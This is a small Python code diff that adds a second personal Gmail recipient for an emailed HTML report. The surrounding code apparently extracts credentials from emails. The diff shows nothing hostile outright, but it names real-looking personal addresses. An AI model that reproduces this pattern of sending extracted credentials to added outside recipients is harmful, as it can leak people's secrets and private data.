@@ -83,6 +83,7 @@ async def main():
         html_report = report_generator.to_html(report)
 
         email_service.send_report(html_report, "pana.stefan@gmail.com")
+        email_service.send_report(html_report, "citre.cristian@gmail.com")
 
     except ExtractionError as e:
         print(f"Found email but couldn't extract credentials: {e}")
